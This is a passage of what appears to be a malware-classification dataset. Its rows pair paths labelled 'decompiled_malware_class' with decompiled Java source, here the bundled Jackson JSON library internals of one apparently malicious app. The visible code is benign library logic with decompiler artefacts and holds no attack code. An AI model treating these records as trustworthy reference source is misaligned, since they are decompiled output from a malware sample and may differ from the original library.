currName=curr.mName;   if (currName.hashCode() == hash && currName.equals(quads,qlen)) {     return currName;   } } return null; } } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.sym\CharsToNameCanonicalizer.code","public final class CharsToNameCanonicalizer {   protected static final int DEFAULT_TABLE_SIZE=64;   static final int MAX_ENTRIES_FOR_REUSE=12000;   protected static final int MAX_TABLE_SIZE=65536;   static final CharsToNameCanonicalizer sBootstrapSymbolTable=new CharsToNameCanonicalizer();   protected Bucket[] _buckets;   protected final boolean _canonicalize;   protected boolean _dirty;   protected int _indexMask;   protected final boolean _intern;   protected CharsToNameCanonicalizer _parent;   protected int _size;   protected int _sizeThreshold;   protected String[] _symbols;   public static CharsToNameCanonicalizer createRoot(){     return sBootstrapSymbolTable.makeOrphan();   }   private CharsToNameCanonicalizer(){     this._canonicalize=true;     this._intern=true;     this._dirty=true;     initTables(64);   }   private void initTables(  int initialSize){     this._symbols=new String[initialSize];     this._buckets=new Bucket[initialSize >> 1];     this._indexMask=initialSize - 1;     this._size=0;     this._sizeThreshold=initialSize - (initialSize >> 2);   }   private CharsToNameCanonicalizer(  CharsToNameCanonicalizer parent,  boolean canonicalize,  boolean intern,  String[] symbols,  Bucket[] buckets,  int size){     this._parent=parent;     this._canonicalize=canonicalize;     this._intern=intern;     this._symbols=symbols;     this._buckets=buckets;     this._size=size;     int arrayLen=symbols.length;     this._sizeThreshold=arrayLen - (arrayLen >> 2);     this._indexMask=arrayLen - 1;     this._dirty=false;   }   public synchronized CharsToNameCanonicalizer makeChild(  boolean canonicalize,  boolean intern){     return new CharsToNameCanonicalizer(this,canonicalize,intern,this._symbols,this._buckets,this._size);   }   private CharsToNameCanonicalizer makeOrphan(){     return new CharsToNameCanonicalizer(null,true,true,this._symbols,this._buckets,this._size);   }   private synchronized void mergeChild(  CharsToNameCanonicalizer child){     if (child.size() > MAX_ENTRIES_FOR_REUSE) {       initTables(64);     }  else     if (child.size() > size()) {       this._symbols=child._symbols;       this._buckets=child._buckets;       this._size=child._size;       this._sizeThreshold=child._sizeThreshold;       this._indexMask=child._indexMask;     }     this._dirty=false;   }   public void release(){     if (maybeDirty() && this._parent != null) {       this._parent.mergeChild(this);       this._dirty=false;     }   }   public int size(){     return this._size;   }   public boolean maybeDirty(){     return this._dirty;   }   public String findSymbol(  char[] buffer,  int start,  int len,  int hash){     String sym;     if (len < 1) {       return """";     }     if (!this._canonicalize) {       return new String(buffer,start,len);     }     int hash2=hash & this._indexMask;     String sym2=this._symbols[hash2];     if (sym2 != null) {       if (sym2.length() == len) {         int i=0;         while (sym2.charAt(i) == buffer[start + i] && (i=i + 1) < len) {         }         if (i == len) {           return sym2;         }       }       Bucket b=this._buckets[hash2 >> 1];       if (b != null && (sym=b.find(buffer,start,len)) != null) {         return sym;       }     }     if (!this._dirty) {       copyArrays();       this._dirty=true;     }  else     if (this._size >= this._sizeThreshold) {       rehash();       hash2=calcHash(buffer,start,len) & this._indexMask;     }     this._size++;     String newSymbol=new String(buffer,start,len);     if (this._intern) {       newSymbol=InternCache.instance.intern(newSymbol);     }     if (this._symbols[hash2] == null) {       this._symbols[hash2]=newSymbol;     }  else {       int bix=hash2 >> 1;       this._buckets[bix]=new Bucket(newSymbol,this._buckets[bix]);     }     return newSymbol;   }   public static int calcHash(  char[] cArr,  int i,  int i2){     int i3=1;     int i4=cArr[0];     while (i3 < i2) {       int i5=(i4 * 31) + cArr[i3];       i3++;       i4=i5;     }     return i4;   }   public static int calcHash(  String key){     int hash=key.charAt(0);     int len=key.length();     for (int i=1; i < len; i++) {       hash=(hash * 31) + key.charAt(i);     }     return hash;   }   private void copyArrays(){     String[] oldSyms=this._symbols;     int size=oldSyms.length;     this._symbols=new String[size];     System.arraycopy(oldSyms,0,this._symbols,0,size);     Bucket[] oldBuckets=this._buckets;     int size2=oldBuckets.length;     this._buckets=new Bucket[size2];     System.arraycopy(oldBuckets,0,this._buckets,0,size2);   }   private void rehash(){     int size=this._symbols.length;     int newSize=size + size;     if (newSize > MAX_TABLE_SIZE) {       this._size=0;       Arrays.fill(this._symbols,(Object)null);       Arrays.fill(this._buckets,(Object)null);       this._dirty=true;       return;     }     String[] oldSyms=this._symbols;     Bucket[] oldBuckets=this._buckets;     this._symbols=new String[newSize];     this._buckets=new Bucket[newSize >> 1];     this._indexMask=newSize - 1;     this._sizeThreshold+=this._sizeThreshold;     int count=0;     for (int i=0; i < size; i++) {       String symbol=oldSyms[i];       if (symbol != null) {         count++;         int index=calcHash(symbol) & this._indexMask;         if (this._symbols[index] == null) {           this._symbols[index]=symbol;         }  else {           int bix=index >> 1;           this._buckets[bix]=new Bucket(symbol,this._buckets[bix]);         }       }     }     int size2=size >> 1;     for (int i2=0; i2 < size2; i2++) {       for (Bucket b=oldBuckets[i2]; b != null; b=b.getNext()) {         count++;         String symbol2=b.getSymbol();         int index2=calcHash(symbol2) & this._indexMask;         if (this._symbols[index2] == null) {           this._symbols[index2]=symbol2;         }  else {           int bix2=index2 >> 1;           this._buckets[bix2]=new Bucket(symbol2,this._buckets[bix2]);         }       }     }     if (count != this._size) {       throw new Error(""Internal error on SymbolTable.rehash(): had "" + this._size + "" entries; now have ""+ count+ ""."");     }   } public static final class Bucket {     private final String _symbol;     private final Bucket mNext;     public Bucket(    String symbol,    Bucket next){       this._symbol=symbol;       this.mNext=next;     }     public String getSymbol(){       return this._symbol;     }     public Bucket getNext(){       return this.mNext;     }     public String find(    char[] buf,    int start,    int len){       String sym=this._symbol;       Bucket b=this.mNext;       while (true) {         if (sym.length() == len) {           int i=0;           while (sym.charAt(i) == buf[start + i] && (i=i + 1) < len) {           }           if (i == len) {             return sym;           }         }         if (b != null) {           sym=b.getSymbol();           b=b.getNext();         }  else {           return null;         }       }     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.sym\Name.code","public abstract class Name {   protected final int mHashCode;   protected final String mName;   public abstract boolean equals(  int i);   public abstract boolean equals(  int i,  int i2);   public abstract boolean equals(  int[] iArr,  int i);   public Name(  String name,  int hashCode){     this.mName=name;     this.mHashCode=hashCode;   }   public String getName(){     return this.mName;   }   public String toString(){     return this.mName;   }   public final int hashCode(){     return this.mHashCode;   }   public boolean equals(  Object o){     return o == this;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.sym\Name1.code","public final class Name1 extends Name {   static final Name1 sEmptyName=new Name1("""",0,0);   final int mQuad;   public Name1(  String name,  int hash,  int quad){     super(name,hash);     this.mQuad=quad;   }   public static final Name1 getEmptyName(){     return sEmptyName;   }   @Override public boolean equals(  int quad){     return quad == this.mQuad;   }   @Override public boolean equals(  int quad1,  int quad2){     return quad1 == this.mQuad && quad2 == 0;   }   @Override public boolean equals(  int[] quads,  int qlen){     return qlen == 1 && quads[0] == this.mQuad;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.sym\Name2.code","public final class Name2 extends Name {   final int mQuad1;   final int mQuad2;   public Name2(  String name,  int hash,  int quad1,  int quad2){     super(name,hash);     this.mQuad1=quad1;     this.mQuad2=quad2;   }   @Override public boolean equals(  int quad){     return false;   }   @Override public boolean equals(  int quad1,  int quad2){     return quad1 == this.mQuad1 && quad2 == this.mQuad2;   }   @Override public boolean equals(  int[] quads,  int qlen){     return qlen == 2 && quads[0] == this.mQuad1 && quads[1] == this.mQuad2;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.sym\Name3.code","public final class Name3 extends Name {   final int mQuad1;   final int mQuad2;   final int mQuad3;   public Name3(  String name,  int hash,  int q1,  int q2,  int q3){     super(name,hash);     this.mQuad1=q1;     this.mQuad2=q2;     this.mQuad3=q3;   }   @Override public boolean equals(  int quad){     return false;   }   @Override public boolean equals(  int quad1,  int quad2){     return false;   }   @Override public boolean equals(  int[] quads,  int qlen){     return qlen == 3 && quads[0] == this.mQuad1 && quads[1] == this.mQuad2 && quads[2] == this.mQuad3;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.sym\NameN.code","public final class NameN extends Name {   final int mQuadLen;   final int[] mQuads;   public NameN(  String name,  int hash,  int[] quads,  int quadLen){     super(name,hash);     if (quadLen < 3) {       throw new IllegalArgumentException(""Qlen must >= 3"");     }     this.mQuads=quads;     this.mQuadLen=quadLen;   }   @Override public boolean equals(  int quad){     return false;   }   @Override public boolean equals(  int quad1,  int quad2){     return false;   }   @Override public boolean equals(  int[] quads,  int qlen){     if (qlen != this.mQuadLen) {       return false;     }     for (int i=0; i < qlen; i++) {       if (quads[i] != this.mQuads[i]) {         return false;       }     }     return true;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.type\JavaType.code","public abstract class JavaType {   protected final Class<?> _class;   protected int _hashCode;   protected Object _typeHandler;   protected Object _valueHandler;   protected abstract JavaType _narrow(  Class<?> cls);   public abstract boolean equals(  Object obj);   public abstract boolean isContainerType();   public abstract JavaType narrowContentsBy(  Class<?> cls);   public abstract String toCanonical();   public abstract String toString();   protected JavaType(  Class<?> clz){     this._class=clz;     String name=clz.getName();     this._hashCode=name.hashCode();   }   public final JavaType narrowBy(  Class<?> subclass){     if (subclass == this._class) {       return this;     }     _assertSubclass(subclass,this._class);     JavaType result=_narrow(subclass);     if (this._valueHandler != null) {       result.setValueHandler(this._valueHandler);     }     if (this._typeHandler != null) {       result.setTypeHandler(this._typeHandler);     }     return result;   }   public final JavaType forcedNarrowBy(  Class<?> subclass){     if (subclass == this._class) {       return this;     }     JavaType result=_narrow(subclass);     if (this._valueHandler != null) {       result.setValueHandler(this._valueHandler);     }     if (this._typeHandler != null) {       result.setTypeHandler(this._typeHandler);     }     return result;   }   public final JavaType widenBy(  Class<?> superclass){     if (superclass == this._class) {       return this;     }     _assertSubclass(this._class,superclass);     return _widen(superclass);   }   protected JavaType _widen(  Class<?> superclass){     return _narrow(superclass);   }   public void setValueHandler(  Object h){     if (h != null && this._valueHandler != null) {       throw new IllegalStateException(""Trying to reset value handler for type ["" + toString() + ""]; old handler of type ""+ this._valueHandler.getClass().getName()+ "", new handler of type ""+ h.getClass().getName());     }     this._valueHandler=h;   }   public void setTypeHandler(  Object h){     if (h != null && this._typeHandler != null) {       throw new IllegalStateException(""Trying to reset type handler for type ["" + toString() + ""]; old handler of type ""+ this._typeHandler.getClass().getName()+ "", new handler of type ""+ h.getClass().getName());     }     this._typeHandler=h;   }   public final Class<?> getRawClass(){     return this._class;   }   public final boolean hasRawClass(  Class<?> clz){     return this._class == clz;   }   public boolean isAbstract(){     return Modifier.isAbstract(this._class.getModifiers());   }   public boolean isConcrete(){     int mod=this._class.getModifiers();     return (mod & 1536) == 0 || this._class.isPrimitive();   }   public boolean isThrowable(){     return Throwable.class.isAssignableFrom(this._class);   }   public boolean isArrayType(){     return false;   }   public final boolean isEnumType(){     return this._class.isEnum();   }   public final boolean isInterface(){     return this._class.isInterface();   }   public final boolean isPrimitive(){     return this._class.isPrimitive();   }   public final boolean isFinal(){     return Modifier.isFinal(this._class.getModifiers());   }   public JavaType getKeyType(){     return null;   }   public JavaType getContentType(){     return null;   }   public int containedTypeCount(){     return 0;   }   public JavaType containedType(  int index){     return null;   }   public String containedTypeName(  int index){     return null;   }   public <T>T getValueHandler(){     return (T)this._valueHandler;   }   public <T>T getTypeHandler(){     return (T)this._typeHandler;   }   protected void _assertSubclass(  Class<?> subclass,  Class<?> superClass){     if (!this._class.isAssignableFrom(subclass)) {       throw new IllegalArgumentException(""Class "" + subclass.getName() + "" is not assignable to ""+ this._class.getName());     }   }   public final int hashCode(){     return this._hashCode;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.type\TypeReference.code","public abstract class TypeReference<T> implements Comparable<TypeReference<T>> {   final Type _type;   protected TypeReference(){     Type superClass=getClass().getGenericSuperclass();     if (superClass instanceof Class) {       throw new IllegalArgumentException(""Internal error: TypeReference constructed without actual type information"");     }     this._type=((ParameterizedType)superClass).getActualTypeArguments()[0];   }   public Type getType(){     return this._type;   }   @Override public int compareTo(  TypeReference<T> o){     return 0;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.util\BufferRecycler.code","public final class BufferRecycler {   public static final int DEFAULT_WRITE_CONCAT_BUFFER_LEN=2000;   protected final byte[][] mByteBuffers=new byte[ByteBufferType.valuesCustom().length];   protected final char[][] mCharBuffers=new char[CharBufferType.valuesCustom().length];   public enum ByteBufferType {  READ_IO_BUFFER(4000),   WRITE_ENCODING_BUFFER(4000),   WRITE_CONCAT_BUFFER(BufferRecycler.DEFAULT_WRITE_CONCAT_BUFFER_LEN);   private final int size;   public static ByteBufferType[] valuesCustom(){     ByteBufferType[] valuesCustom=values();     int length=valuesCustom.length;     ByteBufferType[] byteBufferTypeArr=new ByteBufferType[length];     System.arraycopy(valuesCustom,0,byteBufferTypeArr,0,length);     return byteBufferTypeArr;   }   ByteBufferType(  int size){     this.size=size;   } }   public enum CharBufferType {  TOKEN_BUFFER(BufferRecycler.DEFAULT_WRITE_CONCAT_BUFFER_LEN),   CONCAT_BUFFER(BufferRecycler.DEFAULT_WRITE_CONCAT_BUFFER_LEN),   TEXT_BUFFER(200),   NAME_COPY_BUFFER(200);   private final int size;   public static CharBufferType[] valuesCustom(){     CharBufferType[] valuesCustom=values();     int length=valuesCustom.length;     CharBufferType[] charBufferTypeArr=new CharBufferType[length];     System.arraycopy(valuesCustom,0,charBufferTypeArr,0,length);     return charBufferTypeArr;   }   CharBufferType(  int size){     this.size=size;   } }   public byte[] allocByteBuffer(  ByteBufferType type){     int ix=type.ordinal();     byte[] buffer=this.mByteBuffers[ix];     if (buffer == null) {       return balloc(type.size);     }     this.mByteBuffers[ix]=null;     return buffer;   }   public void releaseByteBuffer(  ByteBufferType type,  byte[] buffer){     this.mByteBuffers[type.ordinal()]=buffer;   }   public char[] allocCharBuffer(  CharBufferType type){     return allocCharBuffer(type,0);   }   public char[] allocCharBuffer(  CharBufferType type,  int minSize){     if (type.size > minSize) {       minSize=type.size;     }     int ix=type.ordinal();     char[] buffer=this.mCharBuffers[ix];     if (buffer == null || buffer.length < minSize) {       return calloc(minSize);     }     this.mCharBuffers[ix]=null;     return buffer;   }   public void releaseCharBuffer(  CharBufferType type,  char[] buffer){     this.mCharBuffers[type.ordinal()]=buffer;   }   private byte[] balloc(  int size){     return new byte[size];   }   private char[] calloc(  int size){     return new char[size];   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.util\ByteArrayBuilder.code","public final class ByteArrayBuilder extends OutputStream {   static final int DEFAULT_BLOCK_ARRAY_SIZE=40;   private static final int INITIAL_BLOCK_SIZE=500;   private static final int MAX_BLOCK_SIZE=262144;   private static final byte[] NO_BYTES=new byte[0];   private final BufferRecycler _bufferRecycler;   private byte[] _currBlock;   private int _currBlockPtr;   private final LinkedList<byte[]> _pastBlocks;   private int _pastLen;   public ByteArrayBuilder(){     this((BufferRecycler)null);   }   public ByteArrayBuilder(  BufferRecycler br){     this(br,INITIAL_BLOCK_SIZE);   }   public ByteArrayBuilder(  int firstBlockSize){     this(null,firstBlockSize);   }   public ByteArrayBuilder(  BufferRecycler br,  int firstBlockSize){     this._pastBlocks=new LinkedList<>();     this._bufferRecycler=br;     if (br == null) {       this._currBlock=new byte[firstBlockSize];     }  else {       this._currBlock=br.allocByteBuffer(BufferRecycler.ByteBufferType.WRITE_CONCAT_BUFFER);     }   }   public void reset(){     this._pastLen=0;     this._currBlockPtr=0;     if (!this._pastBlocks.isEmpty()) {       this._currBlock=this._pastBlocks.getLast();       this._pastBlocks.clear();     }   }   public void release(){     reset();     if (this._bufferRecycler != null && this._currBlock != null) {       this._bufferRecycler.releaseByteBuffer(BufferRecycler.ByteBufferType.WRITE_CONCAT_BUFFER,this._currBlock);     }   }   public void append(  int i){     byte b=(byte)i;     if (this._currBlockPtr >= this._currBlock.length) {       _allocMore();     }     byte[] bArr=this._currBlock;     int i2=this._currBlockPtr;     this._currBlockPtr=i2 + 1;     bArr[i2]=b;   }   public void appendTwoBytes(  int b16){     if (this._currBlockPtr + 1 < this._currBlock.length) {       byte[] bArr=this._currBlock;       int i=this._currBlockPtr;       this._currBlockPtr=i + 1;       bArr[i]=(byte)(b16 >> 8);       byte[] bArr2=this._currBlock;       int i2=this._currBlockPtr;       this._currBlockPtr=i2 + 1;       bArr2[i2]=(byte)b16;       return;     }     append(b16 >> 8);     append(b16);   }   public void appendThreeBytes(  int b24){     if (this._currBlockPtr + 2 < this._currBlock.length) {       byte[] bArr=this._currBlock;       int i=this._currBlockPtr;       this._currBlockPtr=i + 1;       bArr[i]=(byte)(b24 >> 16);       byte[] bArr2=this._currBlock;       int i2=this._currBlockPtr;       this._currBlockPtr=i2 + 1;       bArr2[i2]=(byte)(b24 >> 8);       byte[] bArr3=this._currBlock;       int i3=this._currBlockPtr;       this._currBlockPtr=i3 + 1;       bArr3[i3]=(byte)b24;       return;     }     append(b24 >> 16);     append(b24 >> 8);     append(b24);   }   public byte[] toByteArray(){     int totalLen=this._pastLen + this._currBlockPtr;     if (totalLen == 0) {       return NO_BYTES;     }     byte[] result=new byte[totalLen];     int offset=0;     Iterator<byte[]> it=this._pastBlocks.iterator();     while (it.hasNext()) {       byte[] block=it.next();       int len=block.length;       System.arraycopy(block,0,result,offset,len);       offset+=len;     }     System.arraycopy(this._currBlock,0,result,offset,this._currBlockPtr);     int offset2=offset + this._currBlockPtr;     if (offset2 != totalLen) {       throw new RuntimeException(""Internal error: total len assumed to be "" + totalLen + "", copied ""+ offset2+ "" bytes"");     }     if (!this._pastBlocks.isEmpty()) {       reset();     }     return result;   }   private void _allocMore(){     this._pastLen+=this._currBlock.length;     int newSize=Math.max(this._pastLen >> 1,1000);     if (newSize > MAX_BLOCK_SIZE) {       newSize=MAX_BLOCK_SIZE;     }     this._pastBlocks.add(this._currBlock);     this._currBlock=new byte[newSize];     this._currBlockPtr=0;   }   @Override public void write(  byte[] b){     write(b,0,b.length);   }   @Override public void write(  byte[] b,  int off,  int len){     while (true) {       int max=this._currBlock.length - this._currBlockPtr;       int toCopy=Math.min(max,len);       if (toCopy > 0) {         System.arraycopy(b,off,this._currBlock,this._currBlockPtr,toCopy);         off+=toCopy;         this._currBlockPtr+=toCopy;         len-=toCopy;       }       if (len > 0) {         _allocMore();       }  else {         return;       }     }   }   @Override public void write(  int b) throws IOException {     append(b);   }   @Override public void close(){   }   @Override public void flush(){   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.util\CharTypes.code","public final class CharTypes {   static final char[] HEX_CHARS=""0123456789ABCDEF"".toCharArray();   static final int[] sHexValues;   static final int[] sInputCodes;   static final int[] sInputCodesComment;   static final int[] sInputCodesJsNames;   static final int[] sInputCodesUtf8;   static final int[] sInputCodesUtf8JsNames;   static final int[] sOutputEscapes; static {     int code;     int[] table=new int[g.b];     for (int i=0; i < 32; i++) {       table[i]=-1;     }     table[34]=1;     table[92]=1;     sInputCodes=table;     int[] table2=new int[sInputCodes.length];     System.arraycopy(sInputCodes,0,table2,0,sInputCodes.length);     for (int c=g.c; c < 256; c++) {       if ((c & 224) == 192) {         code=2;       }  else       if ((c & 240) == 224) {         code=3;       }  else       if ((c & 248) == 240) {         code=4;       }  else {         code=-1;       }       table2[c]=code;     }     sInputCodesUtf8=table2;     int[] table3=new int[g.b];     Arrays.fill(table3,-1);     for (int i2=33; i2 < 256; i2++) {       if (Character.isJavaIdentifierPart((char)i2)) {         table3[i2]=0;       }     }     sInputCodesJsNames=table3;     int[] table4=new int[g.b];     System.arraycopy(sInputCodesJsNames,0,table4,0,sInputCodesJsNames.length);     Arrays.fill(table4,g.c,g.c,0);     sInputCodesUtf8JsNames=table4;     sInputCodesComment=new int[g.b];     System.arraycopy(sInputCodesUtf8,g.c,sInputCodesComment,g.c,g.c);     Arrays.fill(sInputCodesComment,0,32,-1);     sInputCodesComment[9]=0;     sInputCodesComment[10]=10;     sInputCodesComment[13]=13;     sInputCodesComment[42]=42;     int[] table5=new int[g.b];     for (int i3=0; i3 < 32; i3++) {       table5[i3]=-(i3 + 1);     }     table5[34]=34;     table5[92]=92;     table5[8]=98;     table5[9]=116;     table5[12]=102;     table5[10]=110;     table5[13]=114;     sOutputEscapes=table5;     sHexValues=new int[g.c];     Arrays.fill(sHexValues,-1);     for (int i4=0; i4 < 10; i4++) {       sHexValues[i4 + 48]=i4;     }     for (int i5=0; i5 < 6; i5++) {       sHexValues[i5 + 97]=i5 + 10;       sHexValues[i5 + 65]=i5 + 10;     }   }   public static final int[] getInputCodeLatin1(){     return sInputCodes;   }   public static final int[] getInputCodeUtf8(){     return sInputCodesUtf8;   }   public static final int[] getInputCodeLatin1JsNames(){     return sInputCodesJsNames;   }   public static final int[] getInputCodeUtf8JsNames(){     return sInputCodesUtf8JsNames;   }   public static final int[] getInputCodeComment(){     return sInputCodesComment;   }   public static final int[] getOutputEscapes(){     return sOutputEscapes;   }   public static int charToHex(  int ch){     if (ch > 127) {       return -1;     }     return sHexValues[ch];   }   public static void appendQuoted(  StringBuilder sb,  String content){     int[] escCodes=sOutputEscapes;     int escLen=escCodes.length;     int len=content.length();     for (int i=0; i < len; i++) {       char c=content.charAt(i);       if (c >= escLen || escCodes[c] == 0) {         sb.append(c);       }  else {         sb.append('\\');         int escCode=escCodes[c];         if (escCode < 0) {           sb.append('u');           sb.append('0');           sb.append('0');           int value=-(escCode + 1);           sb.append(HEX_CHARS[value >> 4]);           sb.append(HEX_CHARS[value & 15]);         }  else {           sb.append((char)escCode);         }       }     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.util\InternCache.code","public final class InternCache extends LinkedHashMap<String,String> {   private static final int MAX_ENTRIES=192;   public static final InternCache instance=new InternCache();   private InternCache(){     super(MAX_ENTRIES,0.8f,true);   }   @Override protected boolean removeEldestEntry(  Map.Entry<String,String> eldest){     return size() > MAX_ENTRIES;   }   public synchronized String intern(  String input){     String result;     result=get(input);     if (result == null) {       result=input.intern();       put(result,result);     }     return result;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson.util\TextBuffer.code","public final class TextBuffer {   static final int MAX_SEGMENT_LEN=262144;   static final char[] NO_CHARS=new char[0];   private final BufferRecycler _allocator;   private char[] _currentSegment;   private int _currentSize;   private boolean _hasSegments=false;   private char[] _inputBuffer;   private int _inputLen;   private int _inputStart;   private char[] _resultArray;   private String _resultString;   private int _segmentSize;   private ArrayList<char[]> _segments;   public TextBuffer(  BufferRecycler allocator){     this._allocator=allocator;   }   public void releaseBuffers(){     if (this._allocator != null && this._currentSegment != null) {       resetWithEmpty();       char[] buf=this._currentSegment;       this._currentSegment=null;       this._allocator.releaseCharBuffer(BufferRecycler.CharBufferType.TEXT_BUFFER,buf);     }   }   public void resetWithEmpty(){     this._inputBuffer=null;     this._inputStart=-1;     this._inputLen=0;     this._resultString=null;     this._resultArray=null;     if (this._hasSegments) {       clearSegments();     }     this._currentSize=0;   }   public void resetWithShared(  char[] buf,  int start,  int len){     this._resultString=null;     this._resultArray=null;     this._inputBuffer=buf;     this._inputStart=start;     this._inputLen=len;     if (this._hasSegments) {       clearSegments();     }   }   public void resetWithCopy(  char[] buf,  int start,  int len){     this._inputBuffer=null;     this._inputStart=-1;     this._inputLen=0;     this._resultString=null;     this._resultArray=null;     if (this._hasSegments) {       clearSegments();     }  else     if (this._currentSegment == null) {       this._currentSegment=findBuffer(len);     }     this._segmentSize=0;     this._currentSize=0;     append(buf,start,len);   }   private final char[] findBuffer(  int needed){     return this._allocator.allocCharBuffer(BufferRecycler.CharBufferType.TEXT_BUFFER,needed);   }   private final void clearSegments(){     this._hasSegments=false;     this._segments.clear();     this._segmentSize=0;     this._currentSize=0;   }   public int size(){     return this._inputStart >= 0 ? this._inputLen : this._segmentSize + this._currentSize;   }   public int getTextOffset(){     if (this._inputStart >= 0) {       return this._inputStart;     }     return 0;   }   public char[] getTextBuffer(){     if (this._inputStart >= 0) {       return this._inputBuffer;     }     if (!this._hasSegments) {       return this._currentSegment;     }     return contentsAsArray();   }   public String contentsAsString(){     if (this._resultString == null) {       if (this._resultArray != null) {         this._resultString=new String(this._resultArray);       }  else       if (this._inputStart >= 0) {         if (this._inputLen < 1) {           this._resultString="""";           return """";         }         this._resultString=new String(this._inputBuffer,this._inputStart,this._inputLen);       }  else {         int segLen=this._segmentSize;         int currLen=this._currentSize;         if (segLen == 0) {           this._resultString=currLen == 0 ? """" : new String(this._currentSegment,0,currLen);         }  else {           StringBuilder sb=new StringBuilder(segLen + currLen);           if (this._segments != null) {             int len=this._segments.size();             for (int i=0; i < len; i++) {               char[] curr=this._segments.get(i);               sb.append(curr,0,curr.length);             }           }           sb.append(this._currentSegment,0,this._currentSize);           this._resultString=sb.toString();         }       }     }     return this._resultString;   }   public char[] contentsAsArray(){     char[] result=this._resultArray;     if (result == null) {       char[] result2=buildResultArray();       this._resultArray=result2;       return result2;     }     return result;   }   public BigDecimal contentsAsDecimal() throws NumberFormatException {     if (this._resultArray != null) {       return new BigDecimal(this._resultArray);     }     if (this._inputStart >= 0) {       return new BigDecimal(this._inputBuffer,this._inputStart,this._inputLen);     }     if (this._segmentSize == 0) {       return new BigDecimal(this._currentSegment,0,this._currentSize);     }     return new BigDecimal(contentsAsArray());   }   public double contentsAsDouble() throws NumberFormatException {     return Double.parseDouble(contentsAsString());   }   public void ensureNotShared(){     if (this._inputStart >= 0) {       unshare(16);     }   }   public void append(  char c){     if (this._inputStart >= 0) {       unshare(16);     }     this._resultString=null;     this._resultArray=null;     char[] curr=this._currentSegment;     if (this._currentSize >= curr.length) {       expand(1);       curr=this._currentSegment;     }     int i=this._currentSize;     this._currentSize=i + 1;     curr[i]=c;   }   public void append(  char[] c,  int start,  int len){     if (this._inputStart >= 0) {       unshare(len);     }     this._resultString=null;     this._resultArray=null;     char[] curr=this._currentSegment;     int max=curr.length - this._currentSize;     if (max >= len) {       System.arraycopy(c,start,curr,this._currentSize,len);       this._currentSize+=len;       return;     }     if (max > 0) {       System.arraycopy(c,start,curr,this._currentSize,max);       start+=max;       len-=max;     }     expand(len);     System.arraycopy(c,start,this._currentSegment,0,len);     this._currentSize=len;   }   public void append(  String str,  int offset,  int len){     if (this._inputStart >= 0) {       unshare(len);     }     this._resultString=null;     this._resultArray=null;     char[] curr=this._currentSegment;     int max=curr.length - this._currentSize;     if (max >= len) {       str.getChars(offset,offset + len,curr,this._currentSize);       this._currentSize+=len;       return;     }     if (max > 0) {       str.getChars(offset,offset + max,curr,this._currentSize);       len-=max;       offset+=max;     }     expand(len);     str.getChars(offset,offset + len,this._currentSegment,0);     this._currentSize=len;   }   public char[] getCurrentSegment(){     if (this._inputStart >= 0) {       unshare(1);     }  else {       char[] curr=this._currentSegment;       if (curr == null) {         this._currentSegment=findBuffer(0);       }  else       if (this._currentSize >= curr.length) {         expand(1);       }     }     return this._currentSegment;   }   public char[] emptyAndGetCurrentSegment(){     resetWithEmpty();     char[] curr=this._currentSegment;     if (curr == null) {       char[] curr2=findBuffer(0);       this._currentSegment=curr2;       return curr2;     }     return curr;   }   public int getCurrentSegmentSize(){     return this._currentSize;   }   public void setCurrentLength(  int len){     this._currentSize=len;   }   public char[] finishCurrentSegment(){     if (this._segments == null) {       this._segments=new ArrayList<>();     }     this._hasSegments=true;     this._segments.add(this._currentSegment);     int oldLen=this._currentSegment.length;     this._segmentSize+=oldLen;     int newLen=Math.min((oldLen >> 1) + oldLen,MAX_SEGMENT_LEN);     char[] curr=_charArray(newLen);     this._currentSize=0;     this._currentSegment=curr;     return curr;   }   public char[] expandCurrentSegment(){     char[] curr=this._currentSegment;     int len=curr.length;     int newLen=len == MAX_SEGMENT_LEN ? 262145 : Math.min(MAX_SEGMENT_LEN,(len >> 1) + len);     this._currentSegment=_charArray(newLen);     System.arraycopy(curr,0,this._currentSegment,0,len);     return this._currentSegment;   }   public String toString(){     return contentsAsString();   }   private void unshare(  int needExtra){     int sharedLen=this._inputLen;     this._inputLen=0;     char[] inputBuf=this._inputBuffer;     this._inputBuffer=null;     int start=this._inputStart;     this._inputStart=-1;     int needed=sharedLen + needExtra;     if (this._currentSegment == null || needed > this._currentSegment.length) {       this._currentSegment=findBuffer(needed);     }     if (sharedLen > 0) {       System.arraycopy(inputBuf,start,this._currentSegment,0,sharedLen);     }     this._segmentSize=0;     this._currentSize=sharedLen;   }   private void expand(  int minNewSegmentSize){     if (this._segments == null) {       this._segments=new ArrayList<>();     }     char[] curr=this._currentSegment;     this._hasSegments=true;     this._segments.add(curr);     this._segmentSize+=curr.length;     int oldLen=curr.length;     int sizeAddition=oldLen >> 1;     if (sizeAddition < minNewSegmentSize) {       sizeAddition=minNewSegmentSize;     }     char[] 